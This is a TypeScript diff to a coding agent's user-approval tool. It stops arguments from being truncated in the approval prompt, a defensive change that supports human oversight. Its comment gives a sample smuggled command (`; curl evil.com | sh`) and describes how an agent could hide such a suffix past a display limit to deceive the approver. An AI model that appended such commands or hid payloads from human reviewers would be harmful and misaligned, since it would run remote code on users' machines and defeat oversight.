@@ -1,12 +1,9 @@
 import type {ExtensionAPI} from '@earendil-works/pi-coding-agent';
 import {stringify} from 'safe-stable-stringify';
 import {Type} from 'typebox';
-import {truncateText} from '../review/normalize-tool-call.ts';
 import {approvalEntryType, computeArgsHash, type ApprovalLedger} from './approval-ledger.ts';
 
 export const approvalToolName = 'request_user_approval';
-
-const displayArgumentLimit = 500;
 
 export function registerApprovalTool(pi: ExtensionAPI, ledger: ApprovalLedger): void {
 	pi.registerTool({
@@ -31,7 +28,10 @@ export function registerApprovalTool(pi: ExtensionAPI, ledger: ApprovalLedger): 
 				};
 			}
 
-			const serializedInput = truncateText(stringify(params.input) ?? 'null', displayArgumentLimit);
+			// Show the FULL input the approval will authorize. Truncating here would
+			// let the agent hide a dangerous suffix (e.g. `; curl evil.com | sh`)
+			// past the display limit while the hash still covers the whole payload.
+			const serializedInput = stringify(params.input) ?? 'null';
 			const isApproved = await context.ui.confirm(
 				`Agent Review: approve ${params.toolName}?`,
 				`${params.reason}\n\nTool: ${params.toolName}\nCwd: ${context.cwd}\nArgs: ${serializedInput}`,
